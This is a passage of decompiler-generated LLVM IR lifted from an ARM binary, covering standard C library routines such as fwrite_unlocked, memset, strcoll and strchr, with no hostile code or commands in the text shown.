  store i32 %v9_15ac4, i32* @r6, align 4
  ret i32 %v1_15af8

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v9_15afc = load i32, i32* @r6, align 4
  %v12_15afc = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_15b04 = load i16, i16* %arg4, align 2
  %v1_15b08 = and i16 %v3_15b04, 192
  %v2_15b0c = icmp eq i16 %v1_15b08, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_15b0c, label %dec_label_pc_15b38, label %dec_label_pc_15b24

dec_label_pc_15b24:                               ; preds = %entry
  store i32 128, i32* %r1.global-to-local, align 4
  %v4_15b2c = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_15b30 = icmp eq i32 %v4_15b2c, 0
  br i1 %v2_15b30, label %dec_label_pc_15b38thread-pre-split, label %dec_label_pc_15ba0

dec_label_pc_15b38thread-pre-split:               ; preds = %dec_label_pc_15b24
  %v0_15b38.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_15b38

dec_label_pc_15b38:                               ; preds = %dec_label_pc_15b38thread-pre-split, %entry
  %v0_15b5c = phi i32 [ %v0_15b38.pr, %dec_label_pc_15b38thread-pre-split ], [ %arg2, %entry ]
  %v2_15b38 = icmp eq i32 %v0_15b5c, 0
  br i1 %v2_15b38, label %dec_label_pc_15ba0, label %bb

bb:                                               ; preds = %dec_label_pc_15b38
  %v1_15b3c = load i32, i32* @r6, align 4
  %v3_15b3c = icmp eq i32 %v1_15b3c, 0
  br i1 %v3_15b3c, label %dec_label_pc_15ba0, label %dec_label_pc_15b44

dec_label_pc_15b44:                               ; preds = %bb
  store i32 %v0_15b5c, i32* %r1.global-to-local, align 4
  %v2_15b4c = udiv i32 -1, %v0_15b5c
  %tmp9 = icmp ugt i32 %v1_15b3c, %v2_15b4c
  %v0_15b78 = load i32, i32* @r5, align 4
  %v1_15b78 = inttoptr i32 %v0_15b78 to i16*
  br i1 %tmp9, label %dec_label_pc_15b78, label %dec_label_pc_15b58

dec_label_pc_15b58:                               ; preds = %dec_label_pc_15b44
  %v2_15b5c = mul i32 %v1_15b3c, %v0_15b5c
  store i32 %v2_15b5c, i32* %r1.global-to-local, align 4
  %v0_15b60 = load i32, i32* @r7, align 4
  %v5_15b64 = call i32 @__stdio_fwrite(i32 %v0_15b60, i32 %v2_15b5c, i16* %v1_15b78)
  %v0_15b68 = load i32, i32* @r4, align 4
  %v2_15b6c = udiv i32 %v5_15b64, %v0_15b68
  store i32 %v2_15b6c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15ba4

dec_label_pc_15b78:                               ; preds = %dec_label_pc_15b44
  %v2_15b78 = load i16, i16* %v1_15b78, align 2
  %v1_15b7c = or i16 %v2_15b78, 8
  store i16 %v1_15b7c, i16* %v1_15b78, align 2
  %v0_15b88 = call i32 @__aeabi_read_tp()
  %v3_15b8c = load i16, i16* @global_var_32088.1320, align 2
  %v4_15b8c = sext i16 %v3_15b8c to i32
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_15b98 = add i32 %v4_15b8c, %v0_15b88
  %v4_15b98 = inttoptr i32 %v3_15b98 to i32*
  store i32 22, i32* %v4_15b98, align 4
  %v0_15ba4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15ba4

dec_label_pc_15ba0:                               ; preds = %dec_label_pc_15b38, %dec_label_pc_15b24, %bb
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15ba4

dec_label_pc_15ba4:                               ; preds = %dec_label_pc_15b78, %dec_label_pc_15b58, %dec_label_pc_15ba0
  %v0_15ba4 = phi i32 [ %v0_15ba4.pre, %dec_label_pc_15b78 ], [ %v2_15b6c, %dec_label_pc_15b58 ], [ 0, %dec_label_pc_15ba0 ]
  store i32 %v9_15afc, i32* @r6, align 4
  store i32 %v12_15afc, i32* @r7, align 4
  ret i32 %v0_15ba4

; uselistorder directives
  uselistorder i16* %v1_15b78, { 0, 2, 1 }
  uselistorder i32 %v1_15b3c, { 1, 0, 2 }
  uselistorder i32 %v0_15b5c, { 0, 2, 1, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_15ba4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15ba0, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v2_15bcc = inttoptr i32 %arg2 to i8*
  %v3_15bcc = call i32 @_memcpy(i8* %v2_15bcc, i32 %arg1)
  ret i32 %v3_15bcc
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_15bd8 = load i32, i32* @r0, align 4
  %v3_15bd8 = inttoptr i32 %v0_15bd8 to i8*
  %v4_15bd8 = call i32 @__GI_memset(i8* %v3_15bd8, i32 0, i32 %arg1)
  ret i32 %v4_15bd8
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_15be0 = load i32, i32* @r0, align 4
  %v1_15be0 = load i32, i32* @r1, align 4
  %v2_15be0 = inttoptr i32 %v0_15be0 to i8*
  %v3_15be0 = call i32 @_memcpy(i8* %v2_15be0, i32 %v1_15be0)
  ret i32 %v3_15be0
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_15bf4 = icmp eq i32 %arg3, 8
  store i1 %v8_15bf4, i1* %cpsr_z.global-to-local, align 1
  %v5_15bf8 = icmp slt i32 %arg3, 8
  br i1 %v5_15bf8, label %dec_label_pc_15c58, label %dec_label_pc_15bfc

dec_label_pc_15bfc:                               ; preds = %entry
  %v4_15bfc = mul i32 %arg2, 256
  %v5_15bfc = or i32 %v4_15bfc, %arg2
  %v4_15c00 = mul i32 %v5_15bfc, 65536
  %v5_15c00 = or i32 %v4_15c00, %v5_15bfc
  store i32 %v5_15c00, i32* @r1, align 4
  %v1_15c0457 = urem i32 %tmp, 4
  %v2_15c0458 = icmp eq i32 %v1_15c0457, 0
  store i1 %v2_15c0458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_15c0458, label %dec_label_pc_15c14, label %bb

bb:                                               ; preds = %dec_label_pc_15bfc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_15bfc ]
  %v3_15c0859 = phi i32 [ %v6_15c08, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_15bfc ]
  %v4_15c08 = inttoptr i32 %v3_15c0859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_15c08, align 1
  %v5_15c08 = load i32, i32* @r3, align 4
  %v6_15c08 = add i32 %v5_15c08, 1
  store i32 %v6_15c08, i32* @r3, align 4
  %v0_15c0c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_15c18.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_15c0c.pr, label %dec_label_pc_15c14, label %.thread

.thread:                                          ; preds = %bb
  %v2_15c0c = add i32 %v0_15c18.pr.pre, -1
  store i32 %v2_15c0c, i32* @r2, align 4
  %v1_15c04 = urem i32 %v6_15c08, 4
  %v2_15c04 = icmp eq i32 %v1_15c04, 0
  store i1 %v2_15c04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c04, label %dec_label_pc_15c14, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_15c08.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_15c08.pre to i8
  br label %bb

dec_label_pc_15c14:                               ; preds = %.thread, %bb, %dec_label_pc_15bfc
  %v0_15c2028 = phi i32 [ %tmp, %dec_label_pc_15bfc ], [ %v6_15c08, %bb ], [ %v6_15c08, %.thread ]
  %v0_15c18.pr = phi i32 [ %arg3, %dec_label_pc_15bfc ], [ %v0_15c18.pr.pre, %bb ], [ %v2_15c0c, %.thread ]
  %v0_15c14 = load i32, i32* @r1, align 4
  store i32 %v0_15c14, i32* @ip, align 4
  %v8_15c1810 = icmp eq i32 %v0_15c18.pr, 8
  store i1 %v8_15c1810, i1* %cpsr_z.global-to-local, align 1
  %v5_15c1c11 = icmp slt i32 %v0_15c18.pr, 8
  br i1 %v5_15c1c11, label %dec_label_pc_15c58, label %dec_label_pc_15c20.preheader

dec_label_pc_15c20.preheader:                     ; preds = %dec_label_pc_15c14
  %v1_15c2046 = inttoptr i32 %v0_15c2028 to i32*
  store i32 %v0_15c14, i32* %v1_15c2046, align 4
  %v3_15c2047 = add i32 %v0_15c2028, 4
  %v4_15c2048 = inttoptr i32 %v3_15c2047 to i32*
  %v5_15c2049 = load i32, i32* @ip, align 4
  store i32 %v5_15c2049, i32* %v4_15c2048, align 4
  %v6_15c2050 = add i32 %v0_15c2028, 8
  store i32 %v6_15c2050, i32* @r3, align 4
  %v0_15c2451 = load i32, i32* @r2, align 4
  %v1_15c2452 = add i32 %v0_15c2451, -8
  store i32 %v1_15c2452, i32* @r2, align 4
  %v5_15c2c53 = icmp slt i32 %v1_15c2452, 8
  br i1 %v5_15c2c53, label %dec_label_pc_15c20.dec_label_pc_15c58.loopexit_crit_edge, label %dec_label_pc_15c30

dec_label_pc_15c30:                               ; preds = %dec_label_pc_15c20.preheader, %dec_label_pc_15c18.dec_label_pc_15c20_crit_edge
  %v6_15c2055 = phi i32 [ %v6_15c20, %dec_label_pc_15c18.dec_label_pc_15c20_crit_edge ], [ %v6_15c2050, %dec_label_pc_15c20.preheader ]
  %v0_15c2054 = phi i32 [ %v12_15c4c, %dec_label_pc_15c18.dec_label_pc_15c20_crit_edge ], [ %v0_15c2028, %dec_label_pc_15c20.preheader ]
  %v1_15c30 = inttoptr i32 %v6_15c2055 to i32*
  %v2_15c30 = load i32, i32* @r1, align 4
  store i32 %v2_15c30, i32* %v1_15c30, align 4
  %v3_15c30 = add i32 %v0_15c2054, 12
  %v4_15c30 = inttoptr i32 %v3_15c30 to i32*
  %v5_15c30 = load i32, i32* @ip, align 4
  store i32 %v5_15c30, i32* %v4_15c30, align 4
  %v6_15c30 = add i32 %v0_15c2054, 16
  store i32 %v6_15c30, i32* @r3, align 4
  %v0_15c34 = load i32, i32* @r2, align 4
  %v1_15c34 = add i32 %v0_15c34, -8
  store i32 %v1_15c34, i32* @r2, align 4
  %v5_15c3c = icmp slt i32 %v1_15c34, 8
  br i1 %v5_15c3c, label %dec_label_pc_15c30.dec_label_pc_15c58.loopexit_crit_edge, label %dec_label_pc_15c40

dec_label_pc_15c40:                               ; preds = %dec_label_pc_15c30
  %v1_15c40 = inttoptr i32 %v6_15c30 to i32*
  %v2_15c40 = load i32, i32* @r1, align 4
  store i32 %v2_15c40, i32* %v1_15c40, align 4
  %v3_15c40 = add i32 %v0_15c2054, 20
  %v4_15c40 = inttoptr i32 %v3_15c40 to i32*
  %v5_15c40 = load i32, i32* @ip, align 4
  store i32 %v5_15c40, i32* %v4_15c40, align 4
  %v6_15c40 = add i32 %v0_15c2054, 24
  store i32 %v6_15c40, i32* @r3, align 4
  %v0_15c44 = load i32, i32* @r2, align 4
  %v1_15c44 = add i32 %v0_15c44, -8
  store i32 %v1_15c44, i32* @r2, align 4
  %v5_15c4c = icmp slt i32 %v1_15c44, 8
  br i1 %v5_15c4c, label %dec_label_pc_15c40.dec_label_pc_15c58.loopexit_crit_edge, label %dec_label_pc_15c18

dec_label_pc_15c18:                               ; preds = %dec_label_pc_15c40
  %v7_15c4c = inttoptr i32 %v6_15c40 to i32*
  %v8_15c4c = load i32, i32* @r1, align 4
  store i32 %v8_15c4c, i32* %v7_15c4c, align 4
  %v9_15c4c = add i32 %v0_15c2054, 28
  %v10_15c4c = inttoptr i32 %v9_15c4c to i32*
  %v11_15c4c = load i32, i32* @ip, align 4
  store i32 %v11_15c4c, i32* %v10_15c4c, align 4
  %v12_15c4c = add i32 %v0_15c2054, 32
  store i32 %v12_15c4c, i32* @r3, align 4
  %v6_15c50 = load i32, i32* @r2, align 4
  %v7_15c50 = add i32 %v6_15c50, -8
  store i32 %v7_15c50, i32* @r2, align 4
  %v5_15c1c = icmp slt i32 %v7_15c50, 8
  br i1 %v5_15c1c, label %dec_label_pc_15c18.dec_label_pc_15c58.loopexit_crit_edge, label %dec_label_pc_15c18.dec_label_pc_15c20_crit_edge

dec_label_pc_15c18.dec_label_pc_15c20_crit_edge:  ; preds = %dec_label_pc_15c18
  %v2_15c20.pre = load i32, i32* @r1, align 4
  %v1_15c20 = inttoptr i32 %v12_15c4c to i32*
  store i32 %v2_15c20.pre, i32* %v1_15c20, align 4
  %v3_15c20 = add i32 %v0_15c2054, 36
  %v4_15c20 = inttoptr i32 %v3_15c20 to i32*
  %v5_15c20 = load i32, i32* @ip, align 4
  store i32 %v5_15c20, i32* %v4_15c20, align 4
  %v6_15c20 = add i32 %v0_15c2054, 40
  store i32 %v6_15c20, i32* @r3, align 4
  %v0_15c24 = load i32, i32* @r2, align 4
  %v1_15c24 = add i32 %v0_15c24, -8
  store i32 %v1_15c24, i32* @r2, align 4
  %v5_15c2c = icmp slt i32 %v1_15c24, 8
  br i1 %v5_15c2c, label %dec_label_pc_15c20.dec_label_pc_15c58.loopexit_crit_edge, label %dec_label_pc_15c30

dec_label_pc_15c18.dec_label_pc_15c58.loopexit_crit_edge: ; preds = %dec_label_pc_15c18
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c58

dec_label_pc_15c20.dec_label_pc_15c58.loopexit_crit_edge: ; preds = %dec_label_pc_15c18.dec_label_pc_15c20_crit_edge, %dec_label_pc_15c20.preheader
  %v1_15c24.lcssa = phi i32 [ %v1_15c2452, %dec_label_pc_15c20.preheader ], [ %v1_15c24, %dec_label_pc_15c18.dec_label_pc_15c20_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c58

dec_label_pc_15c30.dec_label_pc_15c58.loopexit_crit_edge: ; preds = %dec_label_pc_15c30
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c58

dec_label_pc_15c40.dec_label_pc_15c58.loopexit_crit_edge: ; preds = %dec_label_pc_15c40
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c58

dec_label_pc_15c58:                               ; preds = %dec_label_pc_15c14, %dec_label_pc_15c18.dec_label_pc_15c58.loopexit_crit_edge, %dec_label_pc_15c20.dec_label_pc_15c58.loopexit_crit_edge, %dec_label_pc_15c30.dec_label_pc_15c58.loopexit_crit_edge, %dec_label_pc_15c40.dec_label_pc_15c58.loopexit_crit_edge, %entry
  %v0_15c60 = phi i32 [ %arg3, %entry ], [ %v1_15c44, %dec_label_pc_15c40.dec_label_pc_15c58.loopexit_crit_edge ], [ %v1_15c34, %dec_label_pc_15c30.dec_label_pc_15c58.loopexit_crit_edge ], [ %v1_15c24.lcssa, %dec_label_pc_15c20.dec_label_pc_15c58.loopexit_crit_edge ], [ %v7_15c50, %dec_label_pc_15c18.dec_label_pc_15c58.loopexit_crit_edge ], [ %v0_15c18.pr, %dec_label_pc_15c14 ]
  %v2_15c58 = icmp eq i32 %v0_15c60, 0
  store i1 %v2_15c58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c58, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_15c58
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_15c58
  %v1_15c60 = sub i32 7, %v0_15c60
  store i32 %v1_15c60, i32* @r2, align 4
  %v3_15c64 = mul i32 %v1_15c60, 4
  %v4_15c64 = add i32 %v3_15c64, ptrtoint (i32* @global_var_15c6c.1401 to i32)
  call void @__pseudo_branch(i32 %v4_15c64)
  %v0_15c6c = load i32, i32* @r1, align 4
  %v1_15c6c = trunc i32 %v0_15c6c to i8
  %v2_15c6c = load i32, i32* @r3, align 4
  %v3_15c6c = inttoptr i32 %v2_15c6c to i8*
  store i8 %v1_15c6c, i8* %v3_15c6c, align 1
  %v4_15c6c = load i32, i32* @r3, align 4
  %v5_15c6c = add i32 %v4_15c6c, 1
  store i32 %v5_15c6c, i32* %r3.global-to-local, align 4
  %v0_15c70 = load i32, i32* @r1, align 4
  %v1_15c70 = trunc i32 %v0_15c70 to i8
  %v3_15c70 = inttoptr i32 %v5_15c6c to i8*
  store i8 %v1_15c70, i8* %v3_15c70, align 1
  %v4_15c70 = load i32, i32* %r3.global-to-local, align 4
  %v5_15c70 = add i32 %v4_15c70, 1
  store i32 %v5_15c70, i32* %r3.global-to-local, align 4
  %v0_15c74 = load i32, i32* @r1, align 4
  %v1_15c74 = trunc i32 %v0_15c74 to i8
  %v3_15c74 = inttoptr i32 %v5_15c70 to i8*
  store i8 %v1_15c74, i8* %v3_15c74, align 1
  %v4_15c74 = load i32, i32* %r3.global-to-local, align 4
  %v5_15c74 = add i32 %v4_15c74, 1
  store i32 %v5_15c74, i32* %r3.global-to-local, align 4
  %v0_15c78 = load i32, i32* @r1, align 4
  %v1_15c78 = trunc i32 %v0_15c78 to i8
  %v3_15c78 = inttoptr i32 %v5_15c74 to i8*
  store i8 %v1_15c78, i8* %v3_15c78, align 1
  %v4_15c78 = load i32, i32* %r3.global-to-local, align 4
  %v5_15c78 = add i32 %v4_15c78, 1
  store i32 %v5_15c78, i32* %r3.global-to-local, align 4
  %v0_15c7c = load i32, i32* @r1, align 4
  %v1_15c7c = trunc i32 %v0_15c7c to i8
  %v3_15c7c = inttoptr i32 %v5_15c78 to i8*
  store i8 %v1_15c7c, i8* %v3_15c7c, align 1
  %v4_15c7c = load i32, i32* %r3.global-to-local, align 4
  %v5_15c7c = add i32 %v4_15c7c, 1
  store i32 %v5_15c7c, i32* %r3.global-to-local, align 4
  %v0_15c80 = load i32, i32* @r1, align 4
  %v1_15c80 = trunc i32 %v0_15c80 to i8
  %v3_15c80 = inttoptr i32 %v5_15c7c to i8*
  store i8 %v1_15c80, i8* %v3_15c80, align 1
  %v4_15c80 = load i32, i32* %r3.global-to-local, align 4
  %v5_15c80 = add i32 %v4_15c80, 1
  store i32 %v5_15c80, i32* %r3.global-to-local, align 4
  %v0_15c84 = load i32, i32* @r1, align 4
  %v1_15c84 = trunc i32 %v0_15c84 to i8
  %v3_15c84 = inttoptr i32 %v5_15c80 to i8*
  store i8 %v1_15c84, i8* %v3_15c84, align 1
  %v4_15c84 = load i32, i32* %r3.global-to-local, align 4
  %v5_15c84 = add i32 %v4_15c84, 1
  store i32 %v5_15c84, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_15c20, { 1, 0 }
  uselistorder i32 %v12_15c4c, { 1, 2, 0 }
  uselistorder i32 %v0_15c2054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_15c18.pr, { 0, 2, 1 }
  uselistorder i32 %v6_15c08, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_15bfc, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 0, 1, 3, 5, 9, 8, 4, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15c58, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_15c30, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_15c94.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_15c94 = phi i32 [ %v0_15c94.pre, %bb ], [ %v5_15c94, %bb3 ]
  %v0_15c90 = phi i32 [ %tmp, %bb ], [ %v5_15c90, %bb3 ]
  %v1_15c90 = inttoptr i32 %v0_15c90 to i8*
  %v2_15c90 = load i8, i8* %v1_15c90, align 1
  %v3_15c90 = zext i8 %v2_15c90 to i32
  store i32 %v3_15c90, i32* @r2, align 4
  %v1_15c94 = inttoptr i32 %v0_15c94 to i8*
  %v2_15c94 = load i8, i8* %v1_15c94, align 1
  %v3_15c94 = zext i8 %v2_15c94 to i32
  %v2_15c98 = icmp eq i8 %v2_15c90, 0
  br i1 %v2_15c98, label %.dec_label_pc_15ca4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_15c94 = add i32 %v0_15c94, 1
  %v5_15c90 = add i32 %v0_15c90, 1
  %v10_15c9c = icmp eq i8 %v2_15c90, %v2_15c94
  br i1 %v10_15c9c, label %entry, label %dec_label_pc_15ca4

.dec_label_pc_15ca4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_15ca4

dec_label_pc_15ca4:                               ; preds = %bb3, %.dec_label_pc_15ca4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_15ca4_crit_edge ], [ %v3_15c90, %bb3 ]
  %v2_15ca4.pre-phi = sub nsw i32 %.pn, %v3_15c94
  ret i32 %v2_15ca4.pre-phi

; uselistorder directives
  uselistorder i32 %v0_15c90, { 1, 0 }
  uselistorder i32 %v0_15c94, { 1, 0 }
  uselistorder label %dec_label_pc_15ca4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_15d14 = urem i32 %arg1, 256
  %v0_15d343 = load i32, i32* @r0, align 4
  %v1_15d344 = urem i32 %v0_15d343, 4
  %v2_15d345 = icmp eq i32 %v1_15d344, 0
  br i1 %v2_15d345, label %dec_label_pc_15d3c, label %dec_label_pc_15d1c

dec_label_pc_15d1c:                               ; preds = %entry, %dec_label_pc_15d30
  %v0_15d30 = phi i32 [ %v1_15d30, %dec_label_pc_15d30 ], [ %v0_15d343, %entry ]
  %v1_15d1c = inttoptr i32 %v0_15d30 to i8*
  %v2_15d1c = load i8, i8* %v1_15d1c, align 1
  %v3_15d1c = zext i8 %v2_15d1c to i32
  store i32 %v3_15d1c, i32* @r3, align 4
  %v9_15d20 = icmp eq i32 %v3_15d1c, %v1_15d14
  br i1 %v9_15d20, label %dec_label_pc_15df0, label %dec_label_pc_15d28

dec_label_pc_15d28:                               ; preds = %dec_label_pc_15d1c
  %v2_15d28 = icmp eq i8 %v2_15d1c, 0
  br i1 %v2_15d28, label %dec_label_pc_15dec, label %dec_label_pc_15d30

dec_label_pc_15d30:                               ; preds = %dec_label_pc_15d28
  %v1_15d30 = add i32 %v0_15d30, 1
  %v1_15d34 = urem i32 %v1_15d30, 4
  %v2_15d34 = icmp eq i32 %v1_15d34, 0
  br i1 %v2_15d34, label %dec_label_pc_15d3c, label %dec_label_pc_15d1c

dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15d30, %entry
  %v0_15d40 = phi i32 [ %v0_15d343, %entry ], [ %v1_15d30, %dec_label_pc_15d30 ]
  %v4_15d3c = mul nuw nsw i32 %v1_15d14, 256
  %v5_15d3c = or i32 %v4_15d3c, %v1_15d14
  %v4_15d44 = mul i32 %v5_15d3c, 65536
  %v5_15d44 = or i32 %v4_15d44, %v5_15d3c
  br label %dec_label_pc_15d48

dec_label_pc_15d48:                               ; preds = %dec_label_pc_15de4, %dec_label_pc_15d84, %dec_label_pc_15d3c
  %v0_15dac = phi i32 [ %v0_15d40, %dec_label_pc_15d3c ], [ %v4_15d48, %dec_label_pc_15d84 ], [ %v4_15d48, %dec_label_pc_15de4 ]
  %v1_15d48 = inttoptr i32 %v0_15dac to i32*
  %v2_15d48 = load i32, i32* %v1_15d48, align 4
  %v4_15d48 = add i32 %v0_15dac, 4
  %v2_15d50 = xor i32 %v2_15d48, %v5_15d44
  %v2_15d54 = add i32 %v2_15d50, 2130640639
  store i32 %v2_15d54, i32* @ip, align 4
  %v2_15d5c = add i32 %v2_15d48, 2130640639
  %v1_15d60 = sub i32 -1, %v2_15d48
  %v2_15d64 = xor i32 %v2_15d5c, %v1_15d60
  %v2_15d70 = and i32 %v2_15d64, -2130640640
  store i32 %v2_15d70, i32* @r1, align 4
  %v2_15d78 = icmp eq i32 %v2_15d70, 0
  br i1 %v2_15d78, label %dec_label_pc_15d84, label %dec_label_pc_15d8c

dec_label_pc_15d84:                               ; preds = %dec_label_pc_15d48
  %v1_15d6c = sub i32 -1, %v2_15d50
  %v2_15d74 = xor i32 %v2_15d54, %v1_15d6c
  %v2_15d7c = and i32 %v2_15d74, -2130640640
  %v2_15d84 = icmp eq i32 %v2_15d7c, 0
  br i1 %v2_15d84, label %dec_label_pc_15d48, label %dec_label_pc_15d8c

dec_label_pc_15d8c:                               ; preds = %dec_label_pc_15d48, %dec_label_pc_15d84
  %v2_15d8c = inttoptr i32 %v0_15dac to i8*
  %v3_15d8c = load i8, i8* %v2_15d8c, align 1
  %v4_15d8c = zext i8 %v3_15d8c to i32
  store i32 %v4_15d8c, i32* @r3, align 4
  %v9_15d90 = icmp eq i32 %v4_15d8c, %v1_15d14
  br i1 %v9_15d90, label %dec_label_pc_15df0, label %dec_label_pc_15d9c

dec_label_pc_15d9c:                               ; preds = %dec_label_pc_15d8c
  %v2_15d9c = icmp eq i8 %v3_15d8c, 0
  br i1 %v2_15d9c, label %dec_label_pc_15dec, label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15d9c
  %v1_15da4 = add i32 %v0_15dac, 1
  %v2_15da4 = inttoptr i32 %v1_15da4 to i8*
  %v3_15da4 = load i8, i8* %v2_15da4, align 1
  %v4_15da4 = zext i8 %v3_15da4 to i32
  store i32 %v4_15da4, i32* @r3, align 4
  %v9_15da8 = icmp eq i32 %v4_15da4, %v1_15d14
  br i1 %v9_15da8, label %dec_label_pc_15df0, label %dec_label_pc_15db4

dec_label_pc_15db4:                               ; preds = %dec_label_pc_15da4
  %v2_15db4 = icmp eq i8 %v3_15da4, 0
  br i1 %v2_15db4, label %dec_label_pc_15dec, label %dec_label_pc_15dbc

dec_label_pc_15dbc:                               ; preds = %dec_label_pc_15db4
  %v1_15dbc = add i32 %v0_15dac, 2
  %v2_15dbc = inttoptr i32 %v1_15dbc to i8*
  %v3_15dbc = load i8, i8* %v2_15dbc, align 1
  %v4_15dbc = zext i8 %v3_15dbc to i32
  store i32 %v4_15dbc, i32* @r3, align 4
  %v9_15dc0 = icmp eq i32 %v4_15dbc, %v1_15d14
  br i1 %v9_15dc0, label %dec_label_pc_15df0, label %dec_label_pc_15dcc

dec_label_pc_15dcc:                               ; preds = %dec_label_pc_15dbc
  %v2_15dcc = icmp eq i8 %v3_15dbc, 0
  br i1 %v2_15dcc, label %dec_label_pc_15dec, label %dec_label_pc_15dd4

dec_label_pc_15dd4:                               ; preds = %dec_label_pc_15dcc
  %v1_15dd4 = add i32 %v0_15dac, 3
  %v2_15dd4 = inttoptr i32 %v1_15dd4 to i8*
  %v3_15dd4 = load i8, i8* %v2_15dd4, align 1
  %v4_15dd4 = zext i8 %v3_15dd4 to i32
  store i32 %v4_15dd4, i32* @r3, align 4
  %v9_15dd8 = icmp eq i32 %v4_15dd4, %v1_15d14
  br i1 %v9_15dd8, label %dec_label_pc_15df0, label %dec_label_pc_15de4

dec_label_pc_15de4:                               ; preds = %dec_label_pc_15dd4
  %v2_15de4 = icmp eq i8 %v3_15dd4, 0
  br i1 %v2_15de4, label %dec_label_pc_15dec, label %dec_label_pc_15d48

dec_label_pc_15dec:                               ; preds = %dec_label_pc_15d28, %dec_label_pc_15de4, %dec_label_pc_15dcc, %dec_label_pc_15db4, %dec_label_pc_15d9c
  br label %dec_label_pc_15df0

dec_label_pc_15df0:                               ; preds = %dec_label_pc_15d1c, %dec_label_pc_15dd4, %dec_label_pc_15dbc, %dec_label_pc_15da4, %dec_label_pc_15d8c, %dec_label_pc_15dec
  %v1_15df4 = phi i32 [ 0, %dec_label_pc_15dec ], [ %v1_15dd4, %dec_label_pc_15dd4 ], [ %v1_15dbc, %dec_label_pc_15dbc ], [ %v1_15da4, %dec_label_pc_15da4 ], [ %v0_15dac, %dec_label_pc_15d8c ], [ %v0_15d30, %dec_label_pc_15d1c ]
  ret i32 %v1_15df4

; uselistorder directives
  uselistorder i32 %v4_15d48, { 1, 0 }
  uselistorder i32 %v2_15d48, { 0, 2, 1 }
  uselistorder i32 %v0_15dac, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_15d3c, { 1, 0 }
  uselistorder i32 %v1_15d30, { 1, 0, 2 }
  uselistorder i32 %v0_15d343, { 2, 1, 0 }
  uselistorder i32 %v1_15d14, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_15df0, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15dec, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15d8c, { 1, 0 }
